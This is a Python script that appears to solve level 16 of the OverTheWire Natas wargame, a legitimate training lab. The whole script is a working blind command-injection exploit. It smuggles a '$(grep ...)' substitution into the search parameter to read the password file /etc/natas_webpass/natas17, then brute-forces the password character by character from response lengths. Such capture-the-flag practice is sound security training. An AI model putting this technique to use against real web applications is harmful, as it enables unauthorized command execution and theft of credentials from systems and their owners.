import requests as r
import string
import sys

def extract_password(url, auth, proxies):

    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    secret = ""
    for i in range(0, 33):
        try:
            for char in chars:
                
                payload = f"$(grep ^{secret}{char} /etc/natas_webpass/natas17)&submit=Search"
                response = r.get(url+payload, auth=auth, proxies=proxies).headers['Content-Length']
                
                if response != "461983":
                    secret += char
                    print('\r' + "The password for the next level is: " + secret, end='')
                    sys.stdout.flush()
                    break
                else:
                    continue
        except KeyboardInterrupt:
            sys.exit(1)
    print("\n")

if __name__=='__main__':

    url = "http://natas16.natas.labs.overthewire.org/?needle="

    # credentials
    user = "natas16"
    password = "" # insert password from the previous level

    # basic auth
    auth = (user, password)

    # debug
    proxies = {"https": "127.0.0.1:8080", "http": "127.0.0.1:8080"}

    extract_password(url, auth, proxies)
